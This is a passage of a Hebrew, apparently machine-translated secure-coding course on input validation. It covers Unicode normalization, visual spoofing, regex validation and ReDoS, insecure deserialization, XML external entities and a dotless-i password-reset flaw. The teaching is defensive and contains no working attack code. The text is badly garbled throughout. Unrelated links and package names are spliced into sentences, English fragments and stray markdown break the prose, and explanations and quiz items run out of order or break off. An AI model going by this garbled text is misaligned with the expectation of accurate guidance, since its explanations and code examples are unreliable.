    4.  במקרים אחרים, עליך להשתמש בשגרות כדי לבדוק תאימות ל- Unicode. הסיבה לכך היא שישנם כמה רצפים שעשויים להיראות שונים אך תהיה להם אותה משמעות בסיסית. לדוגמה, נקודת הקוד U+FB00 (טיפוגרפית "ff") תואמת, אך לא שוות ערך, ל- U+0066 U+0066 (שתי אותיות "f" לטיניות). מחרוזות שוות ערך תואמות תמיד, אך מחרוזות תואמות אינן תמיד שוות ערך.
    5.  זהו כאב, ולכן תקן Unicode מגדיר הליכי נורמליזציה של טקסט, הנקראים נורמליזציה של Unicode. נורמליזציה של Unicode הופכת רצפים מקבילים או תואמים לאותו רצף תווים בדיוק. ישנן 4 צורות נורמליזציה:
    6.  NFD (נורמליזציה בצורת פירוק קנוני)
    7.  תווים מפורקים על ידי שקילות קנונית, ותווים משולבים מרובים מסודרים בסדר מסוים.
    8.  NFC (נורמליזציה טופס הרכב קנוני)[תווים מפורקים ולאחר מכן מורכבים מחדש על ידי שקילות קנונית.](https://github.com/ossf/security-reviews)NFKD (פירוק תאימות טופס נורמליזציה)
    9.  תווים מפורקים על-ידי תאימות, ותווים משולבים מרובים מסודרים בסדר מסוים.[NFKC (הרכב תאימות טופס נורמליזציה)*תווים מפורקים על ידי תאימות, ולאחר מכן מחדש על ידי שקילות קנונית.*](https://safecode.org/resource-managing-software-security/principles-of-software-assurance-assessment/)מנקודת מבט ביטחונית זה בדרך כלל לא משנה 
    10. אשר[ נורמליזציה של Unicode שבה אתה משתמש, אך אם ברצונך לקבוע אם שתי מחרוזות שוות, עליך להיות ](https://www.openchainproject.org/)עקבי[ על הנורמליזציה שבה אתה משתמש בעת השוואתם. כמו כן, שים לב שברגע שאתה מנרמל רצף של תווים, אתה לא יכול באופן כללי ליצור מחדש בדיוק את הרצף המקורי.](https://www.openchainproject.org/security-guide)התחזות חזותית[התחזות חזותית](https://github.com/OpenChain-Project/SecurityAssuranceGuide/tree/main/Guide/2.0) מתרחשת כאשר שתי מחרוזות שונות מוטעות בכך שהן 
    11. זהה[ על ידי המשתמש. תוקפים ישתמשו לעיתים בהתחזות חזותית כחלק מהתקפה.](https://github.com/ossf/wg-best-practices-os-developers/blob/main/docs/Concise-Guide-for-Evaluating-Open-Source-Software.md#readme)התחזות חזותית יכולה להתרחש אפילו בקבוצת המשנה ASCII של Unicode. הספרה "0" נראית כמו האות הגדולה "O", והספרה "1" נראית כמו האות הקטנה "l". לדוגמה, תוקף עלול לנסות ליצור פעולה זדונית 

5.  **paypa1.com**

    1.   תחום במקום 
    2.  paypal.com
    3.  . הרצף "rn" נקרא לעתים בטעות כאות "m"! עם זאת, רוב המשתמשים באלפבית לטיני מודעים לבעיות אלה, וגופנים רבים דואגים להפוך אותם למובחנים יותר.

6.  **אבל ברגע שאנחנו מתקדמים מעבר לתת-קבוצה ASCII, קיימים טריקים רבים אחרים:**הפירוק["ƶ" עשוי להיות מבוטא כ- U+007A U+0335 (z + שילוב שכבת-על של קו קצר) או כ- U+01B6. משמעות הדבר היא כי רצפים שונים של בתים עשויים עדיין להצביע על אותה אות (ולכן להיראות זהים). נורמליזציה פותרת בעיה זו.](https://github.com/ossf/oss-vulnerability-guide/blob/main/guide.md)תסריט מעורב

7.  **אומיקרון יווני ולטינית "o" בדרך כלל נראים אותו דבר, למרות שהם נמצאים בחלקים שונים של Unicode.**אותו סקריפט

8.  **חלק מהדמויות פשוט נראות דומות. לדוגמה, "-" מקף-מינוס U+002D לעומת מקף "‐" U+2010.**זיוף טקסט דו-כיווני[שפות מסוימות הן בעיקר מימין לשמאל, אך עוברות במצבים מסוימים לשמאל לימין. לפיכך, Unicode כולל מנגנונים לציון כיוון. אבל זה אומר כי המחרוזת "olleh", מוקף "להשתמש מימין לשמאל", ייראה חזותית זהה "שלום".](https://opensource.org/licenses)התחזות חזותית יכולה להיות מאתגרת מאוד להתמודדות באופן כללי. נורמליזציה ושימוש בגופנים ייחודיים לא תמיד מספיק, אבל זה יכול לפעמים להיות מאוד מועיל.

9.  **חידון 1.3: Sidequest: טקסט, Unicode ואזורים**>>ב- Unicode תו מיוצג על-ידי ערך של 16 סיביות. אמת או שקר? <<
    1.  ( ) נכון
    2.  (x) לא נכון
    3.  \[הסבר]
    4.  פשוט יש יותר מדי תווים מכדי לקודד את כולם ב- 16 סיביות, כך ש- Unicode משתמש כעת ב- 21 סיביות כדי לקודד תווים. שפות וממשקי API רבים משתמשים בערכי "תו" של 16 סיביות, אך אם הם מייצגים את כל תווי Unicode, לפעמים תווים אלה הם רק [*.part*](https://arxiv.org/abs/2005.09535) של דמות ממשית.**\[הסבר]**אימות טקסט
    5.  עכשיו שיש לנו הבנה לגבי טקסט, בואו נדבר על אימות זה. כמעט בכל המקרים יש לפחות שתי בדיקות לעשות על טקסט ממקור לא מהימן:
    6.  ודא שהטקסט נמצא בקידוד הטקסט הצפוי. כפי שצוין קודם לכן, אלא אם כן יש לך סיבה לעשות אחרת, אנו ממליצים להשתמש בקידוד UTF-8. UTF-8 יאפשר לך לעבוד עם סקריפטים משפות שרירותיות, הוא תואם לאחור עם ASCII, והוא נתמך באופן נרחב. UTF-8 הוא קידוד טוב, אך לא כל רצף של בתים הוא UTF-8 חוקי. פגיעויות רבות התרחשו מכיוון שמערכת קיבלה בתים מתוקף שאינם חוקיים UTF-8. לכן חשוב מאוד לאמת טקסט UTF-8 לפני שאתה מקבל אותו ממקור לא מהימן.

בדוק אם הוא נמצא באורכים המינימליים והמקסימליים, אם יש אורכים מינימליים ומקסימליים. מערכות רבות ירצו שיהיה להן מקסימום פשוט כדי למנוע מהתוקפים לשלוח כמויות גדולות באופן אבסורדי של נתונים.

1.  [במקרים מסוימים זה עשוי להיות קשה מאוד לבדוק הרבה יותר. שמות אישיים, בפרט, הם מאתגרים, במיוחד אם אתה חייב להתמודד עם שמות בכל האזורים. באזורים רבים יש מוסכמות שונות ממקומות אחרים; לדוגמה, האם השם הפרטי או שם המשפחה (למשל, שם המשפחה) מופיעים ראשונים? אולי אפילו אין שם משפחה או שם פרטי. שמות עשויים להכיל רווחים (אפילו בתוך שם פרטי או שם משפחה), וכמובן, אין ערובה לכך שהשם משתמש רק בתווים לטיניים או סיניים. לדיון באתגרים, ראו ](https://tidelift.com/subscription/choosing-open-source-packages-well)שקרים שמתכנתים מאמינים בהם לגבי שמות – עם דוגמאות
2.  [ מאמר מאת טוני רוג'רס (2018).](https://dwheeler.com/oss_fs_eval.html)

עם זאת, במקרים רבים יש עוד דברים שעליך לעשות כדי לאמת טקסט. במקרים רבים, לערכי טקסט יש כללים נוספים שעליהם לציית להם, וכללים אלה משתנים בהתאם לכל קלט טקסט.[לפעמים ערך הטקסט חייב להיות אחד מרשימה קצרה של ערכים. זה קל, פשוט אחסן את האוסף המותר איפשהו (למשל, בסט או במילון). לאחר מכן, בכל פעם שתקבל קלט, ודא שהקלט הוא אחד מהערכים המותרים.](https://deps.dev/)אבל זה משאיר אותנו עם קלטי טקסט רבים שיש להם כללים, אבל הם לא רק רשימה של ערכים מותרים. הם עשויים להיות תאריכים, שעות, מספרי חלקים, מספרי טלפון, מיקומים ושלל סוגים אחרים של נתונים. אנחנו עדיין צריכים לאמת את התשומות האלה, ולתוכניות רבות יש סוגים רבים ושונים של נתונים. זה אומר שאנחנו צריכים איזושהי דרך [בקלות](https://metrics.openssf.org/) תאר כללי אימות אלה. הכלי הנפוץ למטרה זו הוא ביטויים רגולריים. ביחידה הבאה, נסביר באופן אופציונלי ביטויים רגולריים (regexes) אם אינך מכיר אותם; היחידה שאחריה תסביר כיצד להשתמש בביטויים רגולריים כדי לאמת קלטים.[מבוא לביטויים רגולריים](https://libraries.io/)\[\[אופציונלי]][אם אתה כבר יודע על ביטויים רגולריים, אל תהסס לדלג על יחידה זו.](https://www.openhub.net/)ביטוי רגולרי (a [רגקס](https://lfx.linuxfoundation.org/)) הוא רצף תווים המגדיר תבנית טקסט. כמעט לכל שפות התכנות יש מערכת מובנית או ספרייה הנרכשת בקלות המיישמת שפת ביטוי רגולרי, כך שבדרך כלל קל להתחיל להשתמש בביטויים רגולריים בתוכנית ללא קשר לאופן שבו היא מיושמת.

עם זאת, מפתחי תוכנה מסוימים מעולם לא השתמשו regexes. יחידה זו מספקת מבוא קצר אם אתה עדיין לא מכיר אותם. אם אתה כבר מבין regexes, אל תהסס לדלג ליחידה הבאה!

מבחינה היסטורית regexes פותחו כדי להקל על חיפוש טקסט, אם כי כיום הם משמשים לעתים קרובות כדי לקבוע אם טקסט מסוים מתאים לתבנית. ישנם יישומים רבים של מערכות regex, אבל מאז כולם באים מאותו שורש היסטורי יש להם הרבה במשותף.[הכלל הטריוויאלי ביותר הוא שאות או ספרה תואמות את עצמן. כלומר, הרגקס "](https://spdx.dev/)d[" תואם את האות "](https://csrc.nist.gov/Projects/Software-Identification-SWID/)d[". רוב היישומים משתמשים בהתאמות תלויות רישיות כברירת מחדל, וזה בדרך כלל מה שאתה רוצה.](https://github.com/CycloneDX/specification)כלל נוסף הוא שסוגריים מרובעים מקיפים כלל המציין כל אחד ממספר התווים. אם הסוגריים המרובעים מקיפים רק אלפאנומריים, התבנית תואמת לכל אחד מהם. כל כך 

> \[ברט]

>  מתאים לסינגל "`jeIlyfish`b`jellyfish`", "`I`r`l`", או "`python3-dateutil`t`dateutil`".`python3-dateutil`התבנית "`jeIlyfish`.`python3-dateutil`" מתאים לכל תו אחד, למעט התו החדש. אם ברצונך להתאים לתקופה מילולית, קדם אותה בקו נטוי הפוך ("`jeIlyfish`.["). כמעט לכל יישום של regexes יש מנגנון המאפשר לך להחליט אם "](https://www.zdnet.com/article/two-malicious-python-libraries-removed-from-pypi/).

#### " צריך להתאים לקו חדש.

תבנית regex היא בדרך כלל רצף של כללים, כאמור אחד אחרי השני. לדוגמה, תבנית regex "

CA\[BRT]

" יתאים לטקסט "

.cab

", "

### מכונית

", או "*חתול*", כי האותיות "

1.  c[" ו "](https://arxiv.org/abs/2005.09535)a*" להתאים את עצמם, ו "*\[ברט]

    1.  " מתאים לסינגל "**b**", "**r**", או "**t**".**למעשה, כברירת מחדל, regexes **חיפוש** עבור התבנית הנתונה במחרוזת. כלומר, בדרך כלל יישום regex יראה אם תבנית תואמת טקסט כלשהו אם היא מתחילה בתו הראשון, ואז בתו השני, וכן הלאה, דיווח אם היא יכולה למצוא **כלשהו** גפרור. אז התבנית "**CA\[BRT]

    2.  " יתאים גם "*התפטר*" כי יש "

    3.  חתול

2.  " במילה "

    1.  התפטר

    2.  ".**עם זאת, ביטויים רגולריים יכולים לעשות הרבה יותר. אם אתה עוקב אחר תבנית עם "**\***", כלומר "**0 פעמים או יותר

    3.  ". אז תבנית regex "

    4.  a\*b\*x**" מתאר תבנית של 0 או יותר **a

        's, ואחריו 0 או יותר **b**'s, ואחריו 

    5.  x*. תבנית זו תואמת מחרוזות כמו "*AABX[", "](https://www.sigstore.dev/)BBBx

    6.  ", ו "

ABX*", אבל לא "*ע.א.ב.*". רוב יישומי regex תומכים גם ב "*+[" עבור "](https://azure.microsoft.com/en-us/resources/3-ways-to-mitigate-risk-using-private-package-feeds/)פעם אחת או יותר[" ו "](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)?

1.  " עבור "
2.  0 או 1 פעמים
3.  ". רוב יישומי regex גם מאפשרים לך להשתמש בסוגריים כדי לקבץ ביטויים, לדוגמה, "
4.  f(abc)\*d

" מתאים אם יש "*f*", ואחריו 0 מופעים או יותר של הרצף "[ABC](https://cwe.mitre.org/data/definitions/427.html)", ואחריו האות "*d*".

#### בדרך כלל ניתן לבצע התאמה חסרת רגישות לרישיות באמצעות אפשרות כלשהי. הקפד להגדיר את האזור אם אתה משתמש בהתאמה חסרת רגישות לרישיות, מכיוון שלשפות שונות יש כללים שונים, ולפעמים הכללים יכולים להיות מורכבים. לדוגמה, בגרמנית האות "sharp-s" באותיות קטנות "

ß

" שווה ערך לאותיות רישיות "**ש"ס**" בעת שימוש בהתאמה חסרת רגישות לרישיות. במקרים מסוימים, ייתכן שתרצה לעשות רק "**התאמה חסרת רגישות לרישיות ASCII**"; פעולה זו משווה רצף של נקודות קוד כאילו כל נקודות קוד ASCII בטווח 0x41 ל- 0x5A (A עד Z) מופו לנקודות הקוד המתאימות בטווח 0x61 ל- 0x7A (a עד z).**יש הרבה יותר רגקסים. למעשה, יש ספר שלם על ביטויים רגולריים בלבד, **שליטה בביטויים רגולריים, מהדורה שלישית**מאת ג'פרי פרידל (2006), ויש הדרכות רבות על רגקסים כגון  **ביטויים רגולריים עבור פולק רגולרי

 הדרכה מאת שריאס מינוצ'ה. אבל הקדמה זו תביא אותנו להתחיל, כי אנחנו עכשיו הולכים לדון איך regexes יכול לשמש לאימות קלט.**שימוש בביטויים רגולריים לאימות קלט טקסט**תוכניות רבות צריכות לאמת במהירות טקסט קלט ממקורות לא מהימנים. אמנם ישנן דרכים רבות לעשות זאת, regexes הם לעתים קרובות כלי שימושי במיוחד לאימות קלט של טקסט. Regexes הם בדרך כלל מהירים לרישום (כך שהם לוקחים מעט מאוד זמן פיתוח), קלים לשימוש וזמינים באופן נרחב. הם גם גמישים מספיק עבור משימות אימות קלט רבות, קומפקטיים, ובדרך כלל מתבצעים במהירות רבה. הם גם ידועים ומובנים באופן נרחב. אלה יתרונות חשובים; אם כתיבת אימות קלט קשה מדי, זה לא ייעשה. הם לא פותרים את כל בעיות אימות הקלט האפשריות, אבל הם שימושיים מספיק כדי שיהיה חשוב לדעת אותם.**ביטויים רגולריים שימשו במקור בתוכנה עבור **

חיפוש

###  לתבניות טקסט, לא לאימות קלט טקסט כנגד דוגמת מילוי. Regexes טובים גם באימות קלט טקסט, אך יש כמה דברים שעליך לדעת כדי שתוכל להשתמש ב- regexes כראוי לאימות קלט טקסט.

#### התאם, אל תחפש

בעיה מרכזית עם regexes היא כי כברירת מחדל רוב יישומי regex 

1.  חיפוש

2.   כדי לראות אם ניתן למצוא תבנית נתונה בכל מקום בתוך טקסט כלשהו. כאשר אנו מבצעים אימות קלט איננו רוצים לחפש; אנחנו רוצים לדעת אם כל קלט הטקסט *תואם בדיוק* דפוס. זה אומר שאנחנו צריכים להיות מסוגלים לשאול את יישום regex 

3.  *"האם טקסט קלט זה תואם בדיוק לתבנית זו"* - ולדחות את הקלט אם הוא לא תואם. כמו בכל אימות קלט אחר, עלינו להפוך את התבנית שלנו למגבילה ככל האפשר, ואם הקלט אינו תואם, אז דחה את הקלט.

4.  הדרך הרגילה לדרוש regex כדי להתאים קלט שלם היא לכלול 

5.  עוגנים

6.   ברגקס. פשוט התחל את תבנית regex שלך עם 

> עוגן התחלה

>  \- מיוצג בדרך כלל על ידי "*^*" או לפעמים "[*\א*](https://www.schneier.com/blog/archives/2017/11/me_on_the_equif.html)" - ולסיים את התבנית עם "

#### $

" או לפעמים "

\z

". עם אלה, הקלט כולו חייב להתאים לתבנית. לדוגמה, regex זה יתאים *כלשהו* טקסט המכיל "

#### .cab

", "

#### מכונית

", או "

חתול

" - זה אפילו יתאים "

התפטר

" - אז אתה צריך 

לא

#  השתמש ב- regex כגון זה לאימות קלט:

*   CA\[BRT]

# לעומת זאת, רגקס זה יתאים רק 

# בדיוק

###  המילים "

.cab

", "

![Program Model](program_model.png)

**מכונית**

", או "

חתול*" ברוב יישומי regex, כי "*^*" פירושו *"להתאים את ההתחלה"

 ו- "

$

# " פירושו 

"להתאים את הסוף"

:

1.  ^ca\[brt]$

2.  ביישומים מסוימים (בהתאם לאפשרות), "

3.  ^

4.  " עשוי להיות מתכוון 

5.  "התחלה של כל שורה"

6.   לא 

7.  "תחילת המחרוזת"

##  - ואתה בדרך כלל רוצה 

### "תחילת המחרוזת"

. דבר דומה יכול לקרות עם "

$

". מכאן והלאה נניח כי "*^*" ו "

At each remaining input from potentially untrusted users you need to validate the data that comes in. These input validation checks are a kind of security check, so you need to make sure that these input validation checks are non-bypassable, as we discussed earlier in the design principle *non-bypassability*" המכיל ענף ו/או מסתיים בחזרה והוא עצמו חוזר על עצמו.**אם יש חזרה או הסתעפות ב- regex שהיא עצמה חוזרת על עצמה, כתוב מחדש את ה- regex כך שהתו הבא בקלט יקבע באופן חד משמעי אם החזרה ממשיכה או לא. לדוגמה, לשכתב "**^(א+)+$*" כמו "*^א+$

### ".

גישה אחרת היא להשתמש במנגנונים שאומרים למנוע regex לא לחזור אחורה; ליישומי regex רבים יש *קוונטיפיירים רכושניים* ו/או *קיבוץ אטומי* מה שיכול למנוע מעקב לאחור מיותר.*הימנעו מחזרה בלתי מוגבלת. לדוגמה, הגדר ספירות חזרות מרביות (לדוגמה, *{0,5}*) כך שההתנהגות במקרה הגרוע ביותר מוגבלת מאוד.*כלים מסוימים בוחנים קוד מקור כדי לזהות regexes עם התנהגויות במקרה הגרוע ביותר (אלה עשויים להיות כלים עצמאיים או חלק מכלים גדולים יותר).*היכן שניתן, הגבל תחילה את האורך המרבי של מחרוזות קלט ובדוק תחילה את אורך הקלט. אם התשומות חייבות להיות קצרות, הגידול האקספוננציאלי בזמן עדיין יסתיים ככמות זמן כוללת קטנה.*יישם פסק זמן, ב- regex (אם נתמך) או ביישום בכללותו. לדוגמה *רובי 3.2* תומך בערך זמן קצוב גלובלי של regex (*) ופרמטר פסק זמן בעת הפעלה מיידית של אובייקט ביטוי רגולרי. ה *מנגנוני MatchTime של מסגרת .NET* יכול גם להגדיר ערך פסק זמן גלובלי או אחד עבור כל regex.*אל תפעיל regexes המסופקים על-ידי תוקפים במערכות שאתה בוטח בהן. זה בסדר עבור היריב לספק regex כי הם עצמם תמיד לרוץ (במקרה זה, התוקפים פשוט לתקוף את עצמם). אך אם תוקפים יכולים לספק regexes שאתה מפעיל, ייתכן שהם יוכלו לגרום ל- ReDOS (אלא אם כן נקטת בצעדים אחרים כדי למנוע זאת). Regexes הן, באופן כללי, שפות תכנות, ובדרך כלל עליך להימנע מהפעלת תוכניות המסופקות על-ידי התוקף. אפשר לעשות את זה בצורה מאובטחת יחסית, אבל אתה צריך לנקוט הרבה אמצעי זהירות וזה תמיד בטוח יותר פשוט לא לעשות את זה.*אם אתה מעוניין בפרטים נוספים, עיין ב *דיון ב-OWASP* על זה.*חידון 1.5: התמודדות עם התקפות ReDoS על ביטויים רגולריים*>>איזה מבין אלה *מעשי* דרכים למתן התקפות ReDoS? בחר את כל התשובות הרלוונטיות. <<*\[!x] השתמש במנגנון ביטוי רגולרי שאינו משתמש במעקב לאחור (כלומר, DFA).*\[x] במידת האפשר, כתוב regexes שאין להם התנהגות זו במקרה הגרוע ביותר. לדוגמה, היזהרו מחזרות בתוך חזרות.*\[x] הגבל את הגודל המרבי של הקלט, כך שגם ההתנהגות במקרה הגרוע ביותר לא תהיה כל כך גרועה.*\[ ] אף אחד מהנ"ל*אימות קלט: מעבר למספרים וטקסט

דה-סריאליזציה לא בטוחה[אל תסתפק בקבלת תבניות נתונים מורכבות יותר. במקום זאת, ודא שקבלת קלט זה ממקור לא מהימן לא תגרום לבעיית אבטחה.](https://cwe.mitre.org/data/definitions/20.html)בעיה מסוכנת היא דזריזציה לא בטוחה. *דה-סריאליזציה* הוא תהליך של המרת רצף כלשהו (של בתים או תווים) לפורמט פנימי כלשהו; תהליך זה עשוי ליצור מספר אובייקטים. Deserialization יכול לקרות בעת קריאת נתונים מרשת או מאחסון, כי בשני המקרים יש צורך להפוך רצף של בתים או תווים לפורמט פנימי. למרבה הצער, deserialization יכול לגרום לבעיות חמורות, כי אם המקור אינו מהימן, אז התוקף עשוי לספק רצף מניפולציה:

ייתכן שהנתונים יומרו לערך בלתי צפוי שאין לסמוך עליו. לדוגמה, ייתכן שמדובר בערך מובנה של קובץ Cookie שאמר במקור 

admin=n*אך התוקף עשוי לשנות את הערך ל- *admin=y**. אם התוכנית קיבלה נתונים אלה באופן עיוור, התוקף עלול להפוך לפתע למנהל מערכת!**ביטול סידור הנתונים עלול לגרום לביצוע קוד, לדוגמה, הוא עלול ליצור מחלקות או מופעים ו/או לקרוא לשיטות שנבחרו על-ידי התוקף עם ארגומנטים שסופקו על-ידי התוקף. זוהי בעיה במיוחד עבור פורמטים המיועדים להתמדה שרירותית של אובייקטים. דוגמה לכך היא פורמט מלפפון חמוץ, אשר מבצע באופן אוטומטי קוד במקרים מסוימים בעת deserializing נתונים.**🚩 הפתרון הבטוח ביותר הוא לא לקבל אובייקטים סדרתיים ממקורות לא מהימנים.**אם עליך לקבל אובייקטים סדרתיים ממקורות לא מהימנים, באפשרותך להשתמש בתבניות סידרה שאינן תומכות בביצוע קוד. לדוגמה, השתמש בתבניות סידרה המאפשרות רק סוגי נתונים פרימיטיביים. זה נוגד את הבעיה השנייה - ביצוע קוד - אבל כשלעצמו, זה לא פותר את הבעיה הראשונה - ערכים בלתי צפויים. לכן, אם לאחר בחירת גישה למניעת ביצוע קוד, אמת את הקלט שקיבלת באמצעות הגישות שכבר דנו בהן.**במקרים מסוימים, באפשרותך למנוע התקפות deserialization באמצעות בדיקות אימות. בעיקרון, הפוך נתונים לא מהימנים לנתונים מהימנים! לשם כך, לפני שתבטל את הנתונים, הפעל בדיקת אימות כדי לוודא שהנתונים מגיעים ממקור מהימן. דרך נפוצה לעשות זאת היא על-ידי בדיקת חתימה דיגיטלית, קוד אימות הודעה (MAC), הצפנה מאומתת או אמצעי דומה. גישה זו נפוצה במיוחד ביישומי אינטרנט; לעתים קרובות, שרת אינטרנט ישלח נתונים ללקוח, כך שהלקוח יוכל לשלוח אותם מאוחר יותר בחזרה (לדוגמה, כקובץ Cookie). גישה זו היא בסדר כל עוד שרת האינטרנט מוודא את תקינותו (כדי למנוע יצירת תוקף או חבלה) **לפני** זה מתפורר.**יש אנשים שממליצים לאכוף אילוצי סוג מחרוזת (למשל, לאפשר רק למחלקות מסוימות להיות מסולקות). למרבה הצער, מעקפים רבים לטכניקה זו נמצאו לאורך השנים. זה רעיון טוב כמו **התקשות** טכניקה (או פשוט כדרך לזהות באגים מוקדם). עם זאת, במערכות רבות, זה כנראה מסוכן מדי להמליץ כהגנה נאותה בפני עצמה.**🔔 deserialization לא מאובטח היא טעות נפוצה כל כך ביישומי אינטרנט כי זה 2017 OWASP Top 10 #8, 2021 CWE Top 25 #13, ו 2019 CWE Top 25 #23. זה **CWE-502**, **דה-סדרתיזציה של נתונים לא מהימנים

. זה נחשב גם לחלק 2021 OWASP Top 10 #8 (A08:2021), 

כשלים בתקינות תוכנה ונתונים*. תוקפים עשויים למצוא פגיעויות כאלה קשות יותר לניצול, אך ברגע שהפגיעות מתגלה היא עלולה לגרום לפגיעה מיידית במערכת שלמה, מכיוון שהיא עלולה לספק שליטה מלאה במערכת לתוקף.*חידון 1.6: דה-סריאליזציה לא בטוחה*>>אחד הסיכונים הגדולים בהסרת נתונים הוא שבהתאם לתבנית הסידור, הנתונים עלולים לגרום להפעלת קוד המוגדר על-ידי התוקף. אמת או שקר? <<*(x) נכון

#### ( ) לא נכון

מבני נתוני קלט (XML, HTML, CSV, JSON והעלאות קבצים)

כמובן, לפעמים תוכנית צריכה לקבל מבני נתונים מורכבים נפוצים, כגון XML, HTML, JSON ו- CSV. מאז אלה הם פורמטים נפוצים, כדאי לדבר עליהם במיוחד.

בעוד שמבחינה טכנית מדובר במיתרים, במציאות מדובר במיתרים בעלי מבנה פנימי מורכב יותר משלהם. לעתים קרובות מומלץ להשתמש בספריות שתוכננו במיוחד לטיפול בתבניות קלט אלה, כל עוד הן מיועדות לטפל בקלטים שעלולים להיות זדוניים. בדרך כלל עליך לנסות לזהות ולדחות מבני נתונים שאינם תקפים מבחינה תחבירית, ולאחר מכן, במידת הצורך, לבדוק שהם עומדים בכל סכימה ספציפית שהם אמורים לעמוד בה. באופן אידיאלי, ספריות אלה יאפשרו לך לציין רק מה ברצונך לקבל, ולדחות את כל השאר. אם מנגנונים אלה אינם יכולים לאמת את הקלט באופן מלא, השלם זאת עם כל אימות קלט שאתה צריך כדי להבטיח שרק נתונים חוקיים יתקבלו.

.XML

נתונים והודעות רבים מקודדים ב- XML (שפת סימון מורחבת). XML הוא חלק מתבניות אחרות, כגון SOAP (פרוטוקול גישה לאובייקט פשוט). ישנם שני מונחים אודות XML המבולבלים באופן נרחב:*בנוי היטב*XML בנוי היטב עוקב אחר כללי תחביר מסוימים. לדוגמה, כל התגים שנפתחו חייבים להיות סגורים, ורכיבי XML חייבים להיות מקוננים כראוי. אם אתה מקבל XML, ב- *לפחות* ודא שה- XML בנוי היטב; יש ספריות זמינות בקלות עבור זה, ויישומים אמורים רק לקבל XML כי הוא בנוי היטב.

חוקי

## XML חוקי עונה על הגדרת סכימה כלשהי. הסכימה מציינת מידע כגון 

### מה

 תגים מותרים, כיצד הם עשויים להיות מקוננים, והאם חלקם נדרשים. הגדרת סכימה, אם היא קפדנית, היא סוג של רשימת התרה. לכן, בדיקת תקפות לפני קבלת קלט XML יכולה להיות שימושית מאוד להתמודדות עם התקפות. עם זאת, לעשות 

#### לא

 לאפשר לתוקף לקבוע באיזו סכימה להשתמש - להחליט איזו סכימה בסדר ולהשתמש *ההוא*. לפעמים אין סכימה זמינה, ואם אתה מחלץ רק חלק קטן של XML, ייתכן שלא כדאי ליצור סכימת XML.*אם אתה משתמש ב- XML, קיימת פגיעות נפוצה ביותר שעליך להתמודד איתה הנקראת ישויות חיצוניות של XML (XXE). כדי להבין אותם, אתה צריך להבין כמה פונקציונליות XML שאינה ידועה באופן נרחב.*XML תומך בהפניות חיצוניות שניתן לטעון באופן אוטומטי בעת טעינת המסמך המקורי. ההפניה החיצונית יכולה להיות כל מיקום קובץ או כתובת URL. משמעות הדבר היא שתוקף יכול לספק קבצים שגורמים בשקט לטעינה ולמיקום של קבצים או כתובות URL אחרים במקומות מסוימים. פונקציונליות זו קיימת מסיבה כלשהי, ומערכות מסוימות תלויות בה באופן לגיטימי. עם זאת, מפתחים רבים אין מושג כי זה אפשרי, וזה הוביל פגיעויות רבות. להלן דוגמה למסמך XML עם ישויות חיצוניות מוטבעות:

באופן כללי, אין לקבל הפניות חיצוניות לא מסומנות ממקורות לא מהימנים. הנה כמה פתרונות אפשריים:

קבע את תצורת קורא/מעבד XML כך שיתעלם או ידחה הפניות חיצוניות. הקפידו לבדוק, בבדיקות האוטומטיות שלכם, שעדיין מתעלמים ממנו! מכיוון שרוב היישומים אינם משתמשים בישויות חיצוניות, זהו בדרך כלל הפתרון הקל ביותר.*לאסור או לבדוק (עם רשימת התרה) כל הפניה חיצונית לפני השימוש.*אל תשתמש ב- XML, כולל פורמטים כגון SOAP המשתמשים ב- XML. לפורמטים אחרים, כמו JSON, אין את המנגנון הזה ולכן לא יכולה להיות בעיה זו.

#### לקבלת מידע נוסף אודות בעיה זו, עיין ב 

דף האינטרנט 'ישויות חיצוניות של OWASP XML'

.**🔔 XML XXE היא טעות כה נפוצה ביישומי אינטרנט שהיא 2017 OWASP Top 10 #4, 2021 CWE Top 25 #23, ו- 2019 CWE Top 25 #17. הוא מזוהה גם כ **CWE-611**, **הגבלה לא נכונה של הפניה לישות חיצונית של XML**.**.HTML**בדרך כלל אתה יכול פשוט להתקשר לספרייה כדי לאמת HTML ולהעביר קבוצה של תגים מותרים (למשל,. **\<p>**) ותכונות (למשל, ** tag so that you can say where to link to, and maybe an **id** attribute so others can refer to a particular point). Then, when an attacker tries to provide HTML with other tags (for example, a malicious **mı ke@example.org** (באמצעות i ללא נקודות), שיהיה חשבון דוא"ל שונה מ 

mike@example.org

 (המשתמש ב-i מנוקד). זה הוביל לפגיעות הניתנת לניצול (GitHub Security, 

#### הודעות דוא"ל לאיפוס סיסמה שנמסרו לכתובת הלא נכונה

, 2016).

התקפה זו נראית עדינה, אך זוהי הפרה ברורה של כלל האצבע הבסיסי שלנו: אם יש לך נתונים מהימנים יותר זמינים, נסה להשתמש 

ההוא

 נתונים מהימנים יותר! לדוגמה, אם יש לך בקשה לאיפוס סיסמה, וברצונך לשלוח הודעת דואר אלקטרוני כדי לאשר שהמשתמש שאושר במקור אישר אותה, עליך לשלוח את הודעת הדואר האלקטרוני לאיפוס בדיוק אל 

כבר אושר

###  כתובת דואר אלקטרוני במסד הנתונים שלך. כבר אישרת שזו כתובת הדוא"ל הנכונה, כך שתוכל לתת בה אמון רב יותר. כלל פשוט זה - 

נסה להשתמש בנתונים מהימנים יותר

 \- ימנע התקפות עדינות רבות מבלי שתבחין בכך.*עם זאת, יישומים רבים צריכים לעבד נתונים לא מהימנים. במקרה כזה, כאשר עליך לעבד נתונים לא מהימנים, התייחס אליהם כאל *רדיואקטיבי

####  - כלומר, היזהר כאשר אתה מעבד את זה בכל דרך שהיא, לזכור שזה יכול להיות מתוקף. ישנן דרכים רבות בהן עליכם להיזהר, כפי שנדון.

חידון 2.1: העדיפו נתונים מהימנים. התייחס לנתונים לא מהימנים כמסוכנים*>>אם אנו מקבלים בקשה לאיפוס סיסמה עבור חשבון דוא"ל, ויש לו התאמה חסרת רגישות לרישיות לחשבון דוא"ל מאומת במסד הנתונים שלנו, עלינו לשלוח את האישור לחשבון הדוא"ל שהמשתמש שלח זה עתה. אמת או שקר? <<*( ) נכון

(x) לא נכון**\[הסבר]**ממש לא. תוקף פוטנציאלי שלח כתובת דוא"ל, ולכן הדבר היחיד שאתה יכול להיות בטוח בו הוא שמישהו שלח את כתובת הדוא"ל הזו. אם האיפוס הוא עבור חשבון מסוים, רק הודעת דוא"ל לכתובת 

